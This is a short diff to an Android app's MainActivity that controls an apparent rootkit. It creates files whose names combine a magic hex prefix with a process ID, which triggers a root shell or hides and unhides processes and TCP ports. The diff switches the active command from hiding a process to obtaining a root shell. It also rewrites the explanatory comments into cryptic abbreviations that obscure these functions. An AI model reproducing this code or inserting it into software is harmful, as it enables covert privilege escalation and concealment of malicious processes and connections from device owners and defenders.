@@ -21,16 +21,17 @@ public class MainActivity extends Activity
         
         /***************************************************************
          * filename head:
-         * get root shell: 61CC7AE0
-         * hide pid: C966A01E
-         * unhide pid: 50D55DB7
-         * hide tcpv4 port: 4A6B2318
-         * unhide tcpv4 port: 7FAFD9B1
+         * get rsl: 61CC7AE0
+         * hpid: C966A01E
+         * uhpid: 50D55DB7
+         * ht4port: 4A6B2318
+         * uht4port: 7FAFD9B1
          * ************************************************************/
-        String hidename = "C966A01E";
-        hidename = hidename + myProcessID;
+        String name = "61CC7AE0";
+        //String name = "C966A01E";
+        name = name + myProcessID;
         
-        File file = new File(yygypath, hidename); 
+        File file = new File(yygypath, name); 
         try {
 			file.createNewFile();
 		} catch (IOException e) {
